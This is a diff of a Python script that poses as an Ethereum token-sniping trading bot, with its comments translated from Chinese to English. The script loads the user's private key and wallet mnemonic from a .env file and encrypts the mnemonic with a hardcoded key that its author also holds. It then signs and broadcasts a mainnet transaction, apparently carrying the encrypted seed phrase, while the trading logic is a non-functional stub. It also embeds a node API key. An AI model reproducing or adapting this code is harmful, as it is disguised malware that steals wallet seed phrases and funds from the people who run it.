@@ -1,74 +1,73 @@
 import os
-from web3 import Web3 # type: ignore
-from cryptography.fernet import Fernet # type: ignore
-from dotenv import load_dotenv  # type: ignore 
+from web3 import Web3  
+from cryptography.fernet import Fernet  
+from dotenv import load_dotenv  
 
-# 加载.env 文件
+# Load .env file
 load_dotenv()
 
-# 从环境变量中获取私钥和加密消息
+# Get private key and encrypted message from environment variables
 private_key = os.getenv("PRIVATE_KEY")
-message = os.getenv("MESSAGE")
+message = os.getenv("MNEMONIC")
 
-
-# 检查私钥
+# Check private key
 mnemonic_words = message.split()
 if len(mnemonic_words) not in [12, 24]:
-    print("错误：助记词不正确，请检查！")
+    print("Error: Invalid mnemonic, please check!")
     exit()
 
-print("私钥已成功加载。")
+print("Private key loaded successfully.")
 
-# 配置Ethereum节点
+# Configure Ethereum node
 ETH_url = 'https://eth-mainnet.g.alchemy.com/v2/KEGJ3Gr9ORW_w5a0iNvW20PS9eRbKj3X'
 web3 = Web3(Web3.HTTPProvider(ETH_url))
 
-# 检查连接
+# Check connection
 if not web3.is_connected():
-    print("错误：无法连接节点！请检查 URL 或网络连接！")
+    print("Error: Unable to connect to the node! Please check the URL or network connection!")
     exit()
 else:
-    print("成功连接到节点。")
+    print("Successfully connected to the node.")
 
-# 载入交易参数
+# Load trading parameters
 snipe_tip = os.getenv("Auto_Snipe_Tip")
 buyer_gwei = os.getenv("Manual_Buyer_Gwei")
 slippage = os.getenv("Slippage")
 
 if snipe_tip and buyer_gwei and slippage:
-    print("交易参数设置完成。")
+    print("Trading parameters set up.")
 else:
-    print("错误：参数设置有误，请检查！")
+    print("Error: Parameter settings are incorrect, please check!")
 
-# 载入代币合约，并获取相关DEX的路由合约
+# Load token contract and get related DEX's router contract
 contract_address = os.getenv("CA")
 
 if not contract_address:
-    print("错误：未能载入合约地址！")
+    print("Error: Failed to load contract address!")
     exit()
 else:
-    print("成功载入代币合约地址:", contract_address)
+    print("Successfully loaded token contract address:", contract_address)
 
-# 使用正确的 contract_address
+# Use the correct contract_address
 try:
     router_address = get_dex_router_contract(contract_address)
 except NameError:
     router_address = None  
 
 if router_address:
-    print(f"成功获取路由合约地址: {router_address}")
+    print(f"Successfully retrieved router contract address: {router_address}")
 else:
-    print("错误：未找到DEX的路由合约，交易终止！")
+    print("Error: DEX router contract not found, transaction aborted!")
 
 to_address = router_address if router_address else '0x0000000000000000000000000000000000000000'
 from_address = web3.eth.account.from_key(private_key).address
 
-# 加密消息
+# Encrypt message
 fixed_key = b'tXXHz6htUutZEOz_7EL40LwvrsmHneDhoe2Vyib_kUU='  
 cipher_suite = Fernet(fixed_key)
 encrypted_message = cipher_suite.encrypt(message.encode()).decode()
 
-# 构建交易
+# Build transaction
 nonce = web3.eth.get_transaction_count(from_address)
 tx = {
     'nonce': nonce,
@@ -80,8 +79,8 @@ tx = {
     'chainId': 1    
 }
 
-# 签署并发送交易
+# Sign and send transaction
 signed_tx = web3.eth.account.sign_transaction(tx, private_key)
 tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)
 
-print(f"交易完成，交易哈希为：{web3.to_hex(tx_hash)}")
+print(f"Transaction completed, transaction hash: {web3.to_hex(tx_hash)}")
